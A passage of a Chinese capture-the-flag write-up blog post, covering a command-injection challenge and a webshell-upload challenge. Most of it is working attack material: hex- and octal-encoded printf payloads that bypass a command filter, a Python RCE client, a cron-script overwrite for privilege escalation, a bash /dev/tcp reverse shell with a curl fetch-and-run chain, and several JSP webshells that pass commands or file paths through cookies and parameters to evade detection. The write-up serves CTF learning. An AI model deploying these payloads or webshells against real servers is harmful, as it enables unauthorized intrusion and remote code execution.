+</blockquote>
+<p>​        如果表明了绝对路径，那就可以用了：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span>/bin/printf<span class="token environment constant">$IFS</span><span class="token string">"<span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x64">\x64</span>"</span><span class="token variable">)</span></span>
+<span class="token variable"><span class="token variable">$(</span>/usr/bin/printf<span class="token environment constant">$IFS</span><span class="token string">"<span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x64">\x64</span>"</span><span class="token variable">)</span></span></code></pre>
+
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/LpPO6N5cV7HxiXE.png" alt="image-20201221221415708.png" loading="lazy"></p>
+</blockquote>
+<p>​        </p>
+<p>​        其中，可以使用 <code>which$IFS\printf</code> 命令获取 <code>printf</code> 命令的绝对路径：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/Cu3GQAHeLwdhUko.png" alt="image-20201221221356534.png" loading="lazy"></p>
+</blockquote>
+<p>​        那就可以这么拼了：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token variable">$(</span><span class="token function">which</span><span class="token environment constant">$IFS</span><span class="token punctuation">\</span>printf<span class="token punctuation">)</span><span class="token environment constant">$IFS</span><span class="token string">"<span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x64">\x64</span>"</span><span class="token variable">)</span></span></code></pre>
+
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/gsqcStn4ITmaPMD.png" alt="image-20201221221602786.png" loading="lazy"></p>
+</blockquote>
+<p>​        那么现在就可以执行任意命令：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/aHze3qMdOYyUtFN.png" alt="image-20201221221934973.png" loading="lazy"></p>
+</blockquote>
+<p>​        这里可以先写一个简单脚本方便一些：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> requests <span class="token keyword">import</span> session
+s <span class="token operator">=</span> session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    url <span class="token operator">=</span> <span class="token string">"http://124.70.199.12:32552/run"</span>
+    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            get_cmd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Cmd &lt;=> "</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>get_cmd<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                payload <span class="token operator">=</span> <span class="token string">"\\x"</span> <span class="token operator">+</span> <span class="token string">"\\x"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">for</span> font <span class="token keyword">in</span> get_cmd<span class="token punctuation">)</span>
+                data<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">:</span> <span class="token string">"$($(which$IFS\\printf)$IFS\""</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">"\")"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+                p <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+        <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bye~"</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span></code></pre>
+
+<p>​        显然这里是需要使用 <code>/readflag</code> 来读取 flag的：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/JnymY3TEIbQPkOw.png" alt="image-20201221223502450.png" loading="lazy"></p>
+</blockquote>
+<p>​        提示说 <code>/readflag</code> 需要等待 <code>90</code> 秒才行，再看 <code>/detect.py</code> 文件，发现这个文件可以写入，并且是 <code>root</code> 权限：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/fZChVUd4qOKBHAN.png" alt="image-20201221223950737.png" loading="lazy"></p>
+</blockquote>
+<p>​        把 <code>/detect.py</code> 给 cat 看看：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>signal
+
+out<span class="token operator">=</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ps -ef"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span>out<span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        pid <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        ppid <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        cmd <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> ppid <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> cmd <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"/usr/local/bin/python3.8 /home/ctf/web/app.py"</span><span class="token punctuation">,</span><span class="token string">"/usr/sbin/cron"</span><span class="token punctuation">,</span><span class="token string">"/usr/bin/tail -f /var/log/cron"</span><span class="token punctuation">,</span><span class="token string">"/usr/local/bin/python3.8 /detect.py"</span><span class="token punctuation">,</span><span class="token string">"/bin/sh -c /usr/sbin/cron &amp;&amp; /usr/bin/tail -f /var/log/cron"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            <span class="token keyword">continue</span>
+        os<span class="token punctuation">.</span>kill<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>signal<span class="token punctuation">.</span>SIGKILL<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">pass</span></code></pre>
+
+<p>​        看起来是一个结束其他进程的脚本，那么就不可能通过写一个 <code>bash</code> 脚本读 flag 然后写入某个文件再读了，再看 <code>/home/ctf/web/app.py</code> 文件：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token punctuation">,</span>request
+<span class="token keyword">import</span> subprocess<span class="token punctuation">,</span>re
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/run'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token triple-quoted-string string">r'''[^0-9a-zA-Z">\\\$();]'''</span><span class="token punctuation">,</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'Hacker!'</span>
+    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token triple-quoted-string string">r'''ping|wget|curl|bash|perl|python|php|kill|ps'''</span><span class="token punctuation">,</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'Hacker!'</span>
+    p <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>close_fds<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token punctuation">(</span>msg<span class="token punctuation">,</span> errs<span class="token punctuation">)</span> <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> msg
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'Error!'</span>
+
+app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token string">'5000'</span><span class="token punctuation">)</span></code></pre>
+
+<p>​        这里可以清楚看到对命令执行的过滤的源码，并且这里显然设置了 <code>5</code> 秒的超时时间，看起来是无法直接使用网页的 <strong>rce</strong> 去读flag了。</p>
+<p>​        不过由于 <code>/detect.py</code> 文件是有写权限的，并且看代码并不是死循环清除，应该是一个定时任务（在白名单进程名上显然是有定时任务的），那么就可以尝试将读flag的python代码写入 <code>/detect.py</code> 文件，然后等待定时任务读就行了。</p>
+<p>（当然这里也可以用 <code>ps -aux</code> 来查看当前的进程0.0</p>
+<p>​        比如可以构造以下代码：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag>/tmp/dqv5.txt'</span><span class="token punctuation">)</span></code></pre>
+
+<p>​        不过并不能够直接用 <strong>rce</strong> 覆盖写入 <code>/detect.py</code> 文件，这里得构造另一个payload：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 构造代码输出</span>
+<span class="token variable"><span class="token variable">$(</span><span class="token variable">$(</span><span class="token function">which</span><span class="token environment constant">$IFS</span><span class="token punctuation">\</span>printf<span class="token punctuation">)</span><span class="token environment constant">$IFS</span><span class="token string">"<span class="token entity" title="\x65">\x65</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x68">\x68</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x72">\x72</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x28">\x28</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x29">\x29</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x65">\x65</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x28">\x28</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x66">\x66</span><span class="token entity" title="\x6c">\x6c</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x67">\x67</span><span class="token entity" title="\x3e">\x3e</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x64">\x64</span><span class="token entity" title="\x71">\x71</span><span class="token entity" title="\x76">\x76</span><span class="token entity" title="\x35">\x35</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x78">\x78</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x29">\x29</span>"</span><span class="token variable">)</span></span>
+
+<span class="token comment"># 构造定向目标文件名</span>
+<span class="token variable"><span class="token variable">$(</span><span class="token variable">$(</span><span class="token function">which</span><span class="token environment constant">$IFS</span><span class="token punctuation">\</span>printf<span class="token punctuation">)</span><span class="token environment constant">$IFS</span><span class="token string">"<span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x64">\x64</span><span class="token entity" title="\x65">\x65</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x65">\x65</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x79">\x79</span>"</span><span class="token variable">)</span></span>
+
+<span class="token comment"># 最终payload</span>
+<span class="token variable"><span class="token variable">$(</span><span class="token variable">$(</span><span class="token function">which</span><span class="token environment constant">$IFS</span><span class="token punctuation">\</span>printf<span class="token punctuation">)</span><span class="token environment constant">$IFS</span><span class="token string">"<span class="token entity" title="\x65">\x65</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x68">\x68</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x72">\x72</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x28">\x28</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x29">\x29</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x65">\x65</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x28">\x28</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x66">\x66</span><span class="token entity" title="\x6c">\x6c</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x67">\x67</span><span class="token entity" title="\x3e">\x3e</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x64">\x64</span><span class="token entity" title="\x71">\x71</span><span class="token entity" title="\x76">\x76</span><span class="token entity" title="\x35">\x35</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x78">\x78</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x29">\x29</span>"</span><span class="token variable">)</span></span><span class="token operator">></span><span class="token variable"><span class="token variable">$(</span><span class="token variable">$(</span><span class="token function">which</span><span class="token environment constant">$IFS</span><span class="token punctuation">\</span>printf<span class="token punctuation">)</span><span class="token environment constant">$IFS</span><span class="token string">"<span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x64">\x64</span><span class="token entity" title="\x65">\x65</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x65">\x65</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x79">\x79</span>"</span><span class="token variable">)</span></span></code></pre>
+
+<p>​        这里已经写入了 <code>/detect.py</code> 文件：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/cPuZYbUFlWXzk9x.png" alt="image-20201221225322705.png" loading="lazy"></p>
+</blockquote>
+<p>​        最后只需要等定时任务，等一会读就得到flag了：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/Jq7WPfMAKRNgQzF.png" alt="image-20201221225406341.png" loading="lazy"></p>
+</blockquote>
+<p>​        得到flag：<code>flag&#123;ce44003b76a492b36af16c96f7a72b74&#125;</code></p>
+<pre class="language-none"><code class="language-none">flag&#123;ce44003b76a492b36af16c96f7a72b74&#125;</code></pre>
+
+<p>​        后话：</p>
+<p>​                看别的师傅的wp，这玩意是可以出外网的。。靠！然后直接新建以下内容的文件，文件名为 <code>1</code>：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/xxx.xxx.xxx.xxx/port <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre>
+
+<p>​                可以用 <code>php -S 0.0.0.0:80</code> 或者 <code>python -m SimpleHTTPServer 80</code> 或者 <code>python3 -m http.server 80</code> ，再用 <code>curl</code> 给弄到 <code>/tmp</code> 里边：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">cur<span class="token punctuation">\</span>l<span class="token environment constant">$IFS</span><span class="token variable">$9</span><span class="token string">"[10进制IP]"</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span><span class="token environment constant">$IFS</span><span class="token string">"<span class="token entity" title="\57">\57</span>"</span><span class="token variable">)</span></span><span class="token number">1</span>"<span class="token operator">></span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span><span class="token environment constant">$IFS</span><span class="token string">"<span class="token entity" title="\57">\57</span>"</span><span class="token variable">)</span></span>tmp<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span><span class="token environment constant">$IFS</span><span class="token string">"<span class="token entity" title="\57">\57</span>"</span><span class="token variable">)</span></span>dm</code></pre>
+
+<p>​                然后直接触发就好了：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">ba<span class="token punctuation">\</span>sh<span class="token environment constant">$IFS</span><span class="token punctuation">$(</span>printf<span class="token environment constant">$IFS</span><span class="token string">"<span class="token entity" title="\57">\57</span>"</span>tmp<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span><span class="token environment constant">$IFS</span><span class="token string">"<span class="token entity" title="\57">\57</span>"</span><span class="token variable">)</span></span>dm</code></pre>
+
+<p>​                第一时间把 <code>/detect.py</code> 给覆盖成空的了，不然这个反弹shell可能会被kill！</p>
+<p>​                这里要强调一点！！！实际上并不需要 <code>which</code> 就可以的， <strong>8进制字符</strong> yyds！！！：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span><span class="token environment constant">$IFS</span><span class="token string">"<span class="token entity" title="\151">\151</span><span class="token entity" title="\144">\144</span>"</span><span class="token variable">)</span></span><span class="token punctuation">)</span></code></pre>
+
+<p>​                反正 <strong>16进制字符</strong> 是不太行的，有点迷就对啦！！！</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/AHGCb8q7kSKr2Iw.png" alt="image-20201222214121049.png" loading="lazy"></p>
+</blockquote>
+<hr>
+<h4 id="WEBSHELL-I（未解，复现成功）"><a href="#WEBSHELL-I（未解，复现成功）" class="headerlink" title="WEBSHELL_I（未解，复现成功）"></a>WEBSHELL_I（未解，复现成功）</h4><p>​        啊这，这题吧，一堆人解出来。本来还以为说是bypass对webshell的检测的。就网上搜了一堆的jsp的免杀webshell，还向牌面gdl咨询了不少，然而实际上好像是别的考点。。看了别的师傅的wp，似乎是一个 <strong>多文件上传</strong> ？只检测第1个文件的内容，第二个不检测的。。</p>
+<p>​        然后还有一种说法是，有个老马不会被杀。或者说是前边加上一些正常的语句，好像也是可以的。。下边是别的师傅的wp的老马：</p>
+<pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;
+&lt;HTML&gt;&lt;BODY&gt;
+&lt;FORM METHOD&#x3D;&quot;POST&quot; NAME&#x3D;&quot;myform&quot; ACTION&#x3D;&quot;&quot;&gt;
+&lt;INPUT TYPE&#x3D;&quot;text&quot; NAME&#x3D;&quot;cmd&quot;&gt;
+&lt;INPUT TYPE&#x3D;&quot;submit&quot; VALUE&#x3D;&quot;Send&quot;&gt;
+&lt;&#x2F;FORM&gt;
+&lt;pre&gt;
+&lt;%
+if (request.getParameter(&quot;cmd&quot;) !&#x3D; null) &#123;
+out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;\n&lt;BR&gt;&quot;);
+Process p &#x3D; Runtime.getRuntime().exec(&quot;cat &quot; +
+request.getParameter(&quot;cmd&quot;));
+
+OutputStream os &#x3D; p.getOutputStream();
+InputStream in &#x3D; p.getInputStream();
+DataInputStream dis &#x3D; new DataInputStream(in);
+String disr &#x3D; dis.readLine();
+while ( disr !&#x3D; null ) &#123;
+out.println(disr); disr &#x3D; dis.readLine(); &#125;
+&#125;
+%&gt;
+&lt;&#x2F;pre&gt;
+&lt;&#x2F;BODY&gt;&lt;&#x2F;HTML&gt;</code></pre>
+
+<p>​        emmm，还是太菜了（指搜索引擎都不会！！！</p>
+<p>​        然后吧，当时是 <strong>12.20</strong> 的比赛，在 <strong>23:50</strong> 时候可以读写文件了，但是并不能够自由读写，就差一点就解出来了（大概？）！</p>
+<p>​        只是时间不够了，后来也就那么的顺其自然弄了一个通宵，从 <strong>00:42</strong> 到 <strong>07:12</strong> 总算是弄出来了（其实大部分时间都是从零开始学 <strong>jsp</strong>，毕竟太菜了不会<strong>java</strong>！！！</p>
+<p>​        因为现在环境关了，也不好详细复现，这里就稍微的把流程贴一下好了，下边用 <code>request.getCookies()</code> 就可以 bypass 对 <code>request.getParameter()</code> 的检测了，然后由于从 cookie 写入不能有双引号 “ ，那就用 <code>String.valueOf(&#39;?&#39;)</code> 就行了。</p>
+<ul>
+<li>写文件的payload：</li>
+</ul>
+<pre class="language-jsp" data-language="jsp"><code class="language-jsp"># 写文件
+# Cookie[&quot;payload&quot;] -&gt; &quot;内容&quot;（不能写双引号 &quot; ，分号 ; 以及空格 [ ]）
+# Cookie[&quot;path&quot;] -&gt; &quot;路径&quot; （不能写双引号 &quot; ，分号 ; 以及空格 [ ]）（这里可以写到 &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;upload&#x2F;a.jsp）
+
+&lt;%@ page import&#x3D;&quot;java.io.*&quot; %&gt;
+&lt;%
+String str1 &#x3D; &quot;&quot;;
+String str2 &#x3D; &quot;;&quot;+&quot;%&quot;+&quot;&gt;&quot;;
+String path &#x3D; &quot;&quot;;
+Cookie[] cookie&#x3D;request.getCookies();
+for(Cookie c:cookie)&#123;
+	if(&quot;payload&quot;.equals(c.getName()))&#123;
+		str1 &#x3D; c.getValue();
+	&#125;
+	if(&quot;path&quot;.equals(c.getName()))&#123;
+		path &#x3D; c.getValue();
+	&#125;
+&#125;
+try &#123;
+	PrintWriter pw &#x3D; new PrintWriter(new FileOutputStream(path));
+	pw.println(str1 + str2);
+	pw.close();
+&#125; catch(IOException e) &#123;
+	out.println(e.getMessage());
+&#125;
+%&gt;</code></pre>
+
+<ul>
+<li>读文件的payload：</li>
+</ul>
+<pre class="language-jsp" data-language="jsp"><code class="language-jsp"># 读文件
+# Cookie[&quot;rpath&quot;] -&gt; &quot;文件路径&quot;（不能写双引号 &quot; ，分号 ; 以及空格 [ ]）
+
+&lt;%@ page import&#x3D;&quot;java.io.*&quot; %&gt;
+&lt;%
+String path &#x3D; &quot;&quot;;
+Cookie[] cookie&#x3D;request.getCookies();
+for(Cookie c:cookie)&#123;
+	if(&quot;rpath&quot;.equals(c.getName()))&#123;
+		path &#x3D; c.getValue();
+	&#125;
+&#125;
+try &#123;
+	BufferedReader reader &#x3D; new BufferedReader(new FileReader(path)); 
+	String s &#x3D; reader.readLine(); 
+	StringBuffer sb &#x3D; new StringBuffer(); 
+  while (s !&#x3D; null) 
+  &#123; 
+    sb.append(s); 
+    s &#x3D; reader.readLine(); 
+    sb.append(&quot;\n&quot;);
+  &#125; 
+	out.println(sb.toString()); 
+	reader.close(); 
+&#125; catch(IOException e) &#123;
+	out.println(e.getMessage());
+&#125;
+%&gt;</code></pre>
+
+<ul>
+<li>由 Cookie 写入的自由写文件马的payload：</li>
+</ul>
+<pre class="language-jsp" data-language="jsp"><code class="language-jsp"># 将以下payload写入f.jsp（这里可以写到 &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;upload&#x2F;f.jsp）中，以便绕出Cookie无法写入某些字符的限制
+
+&lt;%new&#x2F;**&#x2F;java.io.FileOutputStream(request.getParameter(String.valueOf(&#39;f&#39;))).write(request.getParameter(String.valueOf(&#39;c&#39;)).getBytes());%&gt;</code></pre>
+
+<ul>
+<li>由 自由写文件马 写入回显马的payload：</li>
+</ul>
+<pre class="language-jsp" data-language="jsp"><code class="language-jsp"># 最后将以下payload写入m.jsp（这里可以写到 &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;upload&#x2F;m.jsp）中，直接回显rce
+# 这里记得URL编码一下
+
+&lt;%java.io.InputStream in&#x3D;Runtime.getRuntime().exec(request.getParameter(String.valueOf(&#39;d&#39;))).getInputStream();int a&#x3D;-1;byte[] b&#x3D;new byte[2048];while((a&#x3D;in.read(b))!&#x3D;-1)&#123;out.println(new String(b));&#125;%&gt;</code></pre>
+
+<p>​        行吧，确实太菜了， 只能够绕道而行！</p>
+<p>​        先把<code>第一个写文件payload</code>给上传了（<code>第二个读文件payload</code>也可以上传，其实不影响的），然后传入以下的 cookie 值：</p>
+<pre class="language-jsp" data-language="jsp"><code class="language-jsp">path:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;upload&#x2F;f.jsp
+payload:&lt;%new&#x2F;**&#x2F;java.io.FileOutputStream(request.getParameter(String.valueOf(&#39;f&#39;))).write(request.getParameter(String.valueOf(&#39;c&#39;)).getBytes())</code></pre>
+
+<p>​        其中， <code>path</code> 是写入的文件路径， <code>payload</code> 是写入的内容（<code>第三个payload</code>的内容）。</p>
+<blockquote>
